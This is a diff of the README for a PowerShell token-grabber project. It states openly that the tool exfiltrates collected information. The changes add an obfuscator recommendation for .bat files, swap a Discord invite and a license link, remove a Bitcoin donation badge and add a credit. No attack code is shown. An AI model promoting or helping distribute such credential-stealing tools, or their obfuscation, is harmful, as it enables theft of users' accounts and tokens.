@@ -29,7 +29,8 @@ This tool is made for data exfiltration. All information collected is sent using
 
 
 # Want to obfuscate the code ?
-Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). 
+Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
+Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat files 
 
 # Screenshot
 
@@ -63,10 +64,10 @@ Cleanup
 ```
 
 # Need Help?
-- Join our server https://discord.com/invite/mdmtCTseNV
+- Join our server https://discord.com/invite/batch
 
 # License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Chainski/Powershell-Token-Grabber/blob/main/LICENSE) file for details
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/kdot227/Powershell-Token-Grabber/blob/main/LICENSE) file for details
 
 # Disclaimer
 I, the creator, am not responsible for any actions, and or damages, caused by this software.
@@ -74,12 +75,9 @@ You bear the full responsibility of your actions and acknowledge that this tool 
 This tool's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
 By using this software, you automatically agree to the above.
 
-## Donate 
-<a href="https://www.blockchain.com/btc/address/16T1fUehoGR4E2sj98u9e9mKuQ7uSLvxRJ"><img src="https://img.shields.io/badge/bitcoin-donate-yellow.svg"></a>
-
-
 # Credits
 - https://github.com/Purp1eW0lf
 - https://github.com/KDot227
+- https://github.com/Chainski
 
 
